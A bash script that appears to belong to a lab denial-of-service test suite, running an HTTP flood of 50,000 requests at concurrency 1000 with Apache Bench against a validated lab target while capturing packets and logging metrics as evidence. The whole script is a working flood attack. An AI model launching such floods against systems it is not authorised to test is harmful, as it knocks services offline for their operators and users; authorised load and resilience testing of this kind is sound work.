#!/usr/bin/env bash
# Phase 6 — DoS Vector 2: HTTP flood con Apache Bench

source "$(dirname "$0")/../lib/common.sh"

validate_target "${LAB_TARGET}"
EVIDENCE_DIR=$(cat /tmp/dos-evidence-dir 2>/dev/null || { echo "[ERROR] Run 00-baseline.sh first" >&2; exit 1; })
banner "DoS Vector 2 — HTTP Flood (Apache Bench)"

PORT="${1:-80}"
URL="http://${LAB_TARGET}:${PORT}/"

log WARN "Pausa de 5 minutos desde el vector anterior requerida. ¿Continuar? (y/N)"
read -r answer
[[ "$answer" != "y" ]] && exit 1

log INFO "Capturing pcap and running ab"
tcpdump -i any -w "${EVIDENCE_DIR}/http-flood.pcap" \
    "host ${LAB_TARGET} and port ${PORT}" &
TCPDUMP_PID=$!

START=$(date +%s)
# 50,000 requests, concurrencia 1000, timeout máximo 60s
ab -n 50000 -c 1000 -t 60 -r "${URL}" \
    > "${EVIDENCE_DIR}/http-flood-ab.txt" 2>&1
END=$(date +%s)

kill "$TCPDUMP_PID" 2>/dev/null || true

log INFO "Vector 2 finished. Duration: $((END-START))s"
log INFO "Key metrics:"
grep -E "(Requests per second|Time per request|Failed requests|Non-2xx)" \
    "${EVIDENCE_DIR}/http-flood-ab.txt" | tee -a "${EVIDENCE_DIR}/run.log"
